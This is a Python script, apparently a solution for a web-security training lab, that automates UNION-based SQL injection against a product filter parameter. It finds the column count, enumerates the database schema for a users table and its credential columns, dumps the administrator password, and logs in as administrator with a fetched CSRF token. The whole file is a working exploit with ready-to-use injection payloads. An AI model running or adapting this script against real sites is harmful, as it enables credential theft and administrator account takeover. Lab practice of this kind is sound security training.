import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

PATH = "/filter?category=Gifts"

# determine columns
def find_column_count(url):
    for i in range(1,51):
        print(f"[+] Testing column count: {i}")
        nulls = ",".join(["NULL"] * i)
        sqli_payload = f"' UNION SELECT {nulls}-- -"
        r = requests.get(url + PATH + sqli_payload, verify = False)
        if "Internal Server Error" not in r.text:
            return i
    return False        


# find users table
def find_users_table(url):
    sqli_payload = "' UNION SELECT null,table_name from INFORMATION_SCHEMA.TABLES-- -"
    r = requests.get(url + PATH + sqli_payload, verify = False)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile('.*users_*.'))
    if users_table:
        return users_table
    else:
        return False    


# find username and password columns
def find_users_columns(url):
    sqli_payload = f"' union select null,column_name from INFORMATION_SCHEMA.COLUMNS where table_name = '{u_table}'-- -"
    r = requests.get(url + PATH + sqli_payload, verify = False)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    users_name_column = soup.find(string=re.compile('.*username*.'))
    users_pass_column = soup.find(string=re.compile('.*password*.'))
    if users_name_column and users_pass_column:
        return users_name_column, users_pass_column
    else:
        return False    


# dump credentials
def _cred_dump(url):
    sqli_payload = f"' UNION SELECT {username_col},{password_col} FROM {u_table}-- -"
    r = requests.get(url + PATH + sqli_payload, verify = False)
    res = r.text
    if "administrator" in res:
        print("[+] Administrator password discovered")
        soup = BeautifulSoup(r.text,'html.parser')
        admin_password = soup.body.find(string="administrator").parent.find_next("td").contents[0]
        return admin_password
    return None    

# get csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/login", verify = False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    return csrf

# login as admin
def admin_login(url, dump):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "administrator", "password": dump}
    r = s.post(url + "/login", data = data, verify = False)
    res = r.text
    if "Log out" in res:
        return True
    return False    


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit()    

    col_num = find_column_count(url)
    if col_num:
        print("[+] The number of columns is: " + str(col_num))

    u_table =  find_users_table(url)
    if u_table:
        print("[+] The users table is named: " + str(u_table))

    u_columns = find_users_columns(url)
    if u_columns:
        print("[+] The username and password columns are: " + str(u_columns))
        username_col, password_col = u_columns

    dump = _cred_dump(url)
    if dump:
        print("[+] The administrator password is: " + str(dump))

    s = requests.Session()
    if admin_login(url, dump):
        print("[+] Successfully logged in as the administrator")
    else:
        print("[-] Login failed")                